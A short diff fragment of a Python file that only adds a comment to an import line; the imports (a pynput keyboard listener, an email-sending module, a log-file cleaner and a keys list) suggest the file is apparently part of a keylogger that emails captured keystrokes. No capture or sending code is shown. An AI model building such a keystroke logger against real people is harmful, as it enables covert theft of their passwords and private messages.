@@ -1,6 +1,6 @@
 
 from pynput.keyboard import Key, Listener  #Handling Keyboard listeners.
-from sendemail import sendemail
+from sendemail import sendemail #Imported email module
 from logfilecleaner import clean 
 import sys
 keys = []
